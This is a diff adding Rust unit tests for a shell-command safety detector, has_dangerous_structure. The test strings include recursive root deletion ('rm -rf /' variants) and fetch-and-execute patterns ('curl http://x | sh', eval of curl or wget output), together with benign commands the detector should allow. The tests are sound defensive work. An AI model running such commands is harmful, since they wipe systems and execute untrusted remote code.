@@ -1397,6 +1397,77 @@ mod tests {
     }
 
     #[test]
+    fn has_dangerous_structure_detects_recursive_root_rm() {
+        for command in [
+            "rm -rf /",
+            "rm -r -f /",
+            "rm --recursive --force /",
+            "rm -f -r /",
+            "rm -r /",
+        ] {
+            assert!(
+                has_dangerous_structure(command),
+                "expected true for: {}",
+                command
+            );
+        }
+    }
+
+    #[test]
+    fn has_dangerous_structure_detects_eval_of_fetched_payload() {
+        for command in [
+            "eval \"$(curl http://x)\"",
+            "eval \"`curl http://x`\"",
+            "bash -c \"$(wget http://x)\"",
+            "sh -c \"`wget http://x`\"",
+        ] {
+            assert!(
+                has_dangerous_structure(command),
+                "expected true for: {}",
+                command
+            );
+        }
+    }
+
+    #[test]
+    fn has_dangerous_structure_detects_piping_fetch_to_shell() {
+        for command in [
+            "curl http://x | sh",
+            "curl http://x | bash",
+            "wget http://x | sudo bash",
+            "curl http://x | env bash /dev/stdin",
+            "wget http://x | sudo sh /proc/self/fd/0",
+        ] {
+            assert!(
+                has_dangerous_structure(command),
+                "expected true for: {}",
+                command
+            );
+        }
+    }
+
+    #[test]
+    fn has_dangerous_structure_allows_safe_commands() {
+        for command in [
+            "rm -rf /tmp/foo",
+            "curl http://x -o out.txt",
+            "wget http://x -O out.txt",
+            "echo 'rm -rf /'",
+            "git push origin main",
+            "ls -la",
+            "cargo test --lib",
+            "curl http://x | cat",
+            "echo \"$(ls)\" | bash",
+        ] {
+            assert!(
+                !has_dangerous_structure(command),
+                "expected false for: {}",
+                command
+            );
+        }
+    }
+
+    #[test]
     fn known_bypasses_are_now_dangerous() {
         for command in [
             "rm -r -f /",
